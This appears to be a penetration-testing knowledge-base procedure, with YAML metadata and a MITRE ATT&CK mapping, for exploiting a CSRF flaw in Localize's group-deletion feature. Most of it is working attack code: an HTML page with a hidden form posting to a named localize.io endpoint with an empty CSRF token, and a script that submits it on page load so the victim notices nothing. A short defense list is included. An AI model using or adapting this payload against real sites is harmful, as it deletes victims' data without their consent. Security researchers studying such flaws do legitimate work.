---
tags:
  - csrf
  - exploit
  - html
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:15.120Z'
sub_techniques: []
id: d536437d-48f1-42c1-8c32-37578b1d4352
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Create Malicious CSRF Form

## Summary

This procedure crafts a malicious HTML page with an auto-submitting form that exploits the CSRF vulnerability in Localize's group deletion by forging a POST request without a valid token.

## Description

The form targets the identified deletion endpoint, includes the deleteGroup[id] parameter for the victim's group, and intentionally omits the CSRFToken. JavaScript ensures automatic submission upon page load, making it seamless for drive-by execution when the victim visits the page while authenticated.

## Requirements

1. Valid group ID from reconnaissance
2. Text editor for HTML creation
3. Basic JavaScript knowledge for auto-submit

## Defense

Defensive measures and detection strategies:

- Enforce same-site cookies (Lax/Strict) to prevent cross-site requests
- Log and alert on cross-origin form submissions
- Educate users on phishing risks and link verification

## Objectives

1. Generate a self-contained HTML exploit payload
2. Ensure automatic execution without user input
3. Target specific group deletion

## Instructions

### Step 1: Write the HTML Form

**Context**: Create the base HTML structure with a form pointing to the endpoint.

```html
<!DOCTYPE html>
<html>
<head><title>CSRF Exploit</title></head>
<body>
<form id="csrfForm" action="http://www.localize.io/pages/create_project/9k" method="POST">
<input type="hidden" name="deleteGroup[id]" value="TARGET_GROUP_ID">
<input type="hidden" name="CSRFToken" value="">
</form>
</body>
</html>
```

> Replace TARGET_GROUP_ID with the actual ID. The empty CSRFToken exploits the validation flaw.

### Step 2: Add Auto-Submit Script

**Context**: Append JavaScript to submit the form on load.

Add this before the closing </body> tag:

```html
<script>document.getElementById('csrfForm').submit();</script>
```

**Expected Output**: HTML file that loads and immediately sends the POST request.

**Success Indicators**:
- Page loads and form submits in under 1 second
- No visible elements to alert the user

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[malicious-html]]
